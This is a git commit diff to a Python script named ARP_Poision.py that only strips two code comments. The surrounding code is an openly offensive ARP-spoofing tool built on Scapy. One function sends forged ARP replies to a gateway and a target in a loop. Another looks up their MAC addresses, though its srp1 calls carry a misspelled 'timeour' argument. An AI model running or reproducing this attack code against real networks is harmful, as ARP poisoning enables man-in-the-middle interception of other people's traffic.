f856cdad44e1b08b4c6b40e8427f53ee3b2336dc
Glitch422 <90115880+glitch422@users.noreply.github.com>
2022-05-07 14:24:42 +0300

    Update ARP_Poision.py

--- ARP_Poision.py
+++ ARP_Poision.py
@@ -7,11 +7,11 @@ def arp_poison(gw_ip, gw_mac, target_ip, target_mac):
         send(ARP(op=2, pdst=gw_ip, hwdst=gw_mac, psrc=target_ip), verbose=0)
         send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw_ip), verbose=0)
         print(f"Attacking GW {gw_ip} and the target {target_ip} ...")
-        time.sleep(1) #Turtelling-מנוחה בין חבילה לחבילה
+        time.sleep(1) 
 
 
 def mac_grabber(gw_ip, target_ip):
-    answer_gw = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw_ip, hwdst='ff:ff:ff:ff:ff:ff', op=1), timeour=2, verbose=0, retry=1) #retry => if not success try again (only to timeout)
+    answer_gw = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw_ip, hwdst='ff:ff:ff:ff:ff:ff', op=1), timeour=2, verbose=0, retry=1) 
     gw_mac = answer_gw.hwsrc
     answer_target = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', op=1), timeour=2, verbose=0, retry=1)
     target_mac = answer_target.hwsrc
